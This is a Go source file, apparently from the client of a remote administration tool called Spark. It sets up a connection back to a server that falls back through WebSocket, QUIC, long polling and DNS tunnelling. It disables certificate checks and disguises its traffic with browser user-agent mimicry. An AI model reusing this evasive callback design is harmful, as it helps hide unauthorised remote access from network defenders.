package core

import (
	"Spark/client/common"
	"Spark/client/config"
	"Spark/client/telemetry"
	"Spark/client/transport"
	"context"
	"fmt"
	"time"

	"github.com/kataras/golog"
)

// connectWithFallback attempts to connect using transport fallback mechanism
// Priority: WS → WSS → QUIC → Long Polling → DNS
func connectWithFallback(ctx context.Context) (*common.Conn, error) {
	// Build transport configuration
	cfg := &transport.Config{
		ServerURL:  config.GetBaseURL(true),
		UUID:       config.Config.UUID,
		Key:        config.Config.Key,

		// Timeouts
		ConnectTimeout:  10 * time.Second,
		ReadTimeout:     90 * time.Second,
		WriteTimeout:    10 * time.Second,

		// TLS settings
		InsecureSkipVerify: true, // Accept self-signed certificates

		// DNS tunneling config (if enabled)
		DNSServer: "8.8.8.8:53",
		DNSDomain: config.Config.DNSTunnelDomain, // Add this to config

		// Long polling config
		LongPollTimeout: 30 * time.Second,
		LongPollPath:    "/api/longpoll",

		// QUIC config
		QUICEnabled: config.Config.EnableQUIC, // Add this to config
		QUICPort:    443,

		// Protocol mimicry
		Mimicry: &transport.ProtocolMimicryConfig{
			Enabled: config.Config.EnableMimicry, // Add this to config
			UserAgents: []string{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
			},
			Headers: map[string]string{
				"Accept-Language": "en-US,en;q=0.9",
				"Accept-Encoding": "gzip, deflate, br",
			},
			Protocol: "h2", // HTTP/2
		},
	}

	// Create transport manager
	manager := transport.NewManager(cfg)
	defer func() {
		// Don't close manager here since connection might be using it
	}()

	// Attempt connection with fallback
	conn, usedTransport, err := manager.Connect(ctx)
	if err != nil {
		telemetry.LogWSError("all transports failed", err, nil)
		return nil, fmt.Errorf("all transports failed: %w", err)
	}

	// Log successful transport
	telemetry.LogWSEvent("connected via transport", map[string]interface{}{
		"transport": usedTransport.Name(),
		"priority":  usedTransport.Priority(),
	})

	golog.Infof("core: Connected successfully using %s transport", usedTransport.Name())

	return conn, nil
}

// enableTransportFallback is a feature flag to enable/disable new transport system
// Set to true to use new fallback transports, false to use legacy WebSocket only
var enableTransportFallback = true

// connectWithAutoFallback automatically chooses between new and legacy connection methods
func connectWithAutoFallback(ctx context.Context) (*common.Conn, error) {
	if enableTransportFallback {
		return connectWithFallback(ctx)
	}
	// Legacy WebSocket-only connection
	return connectWS()
}
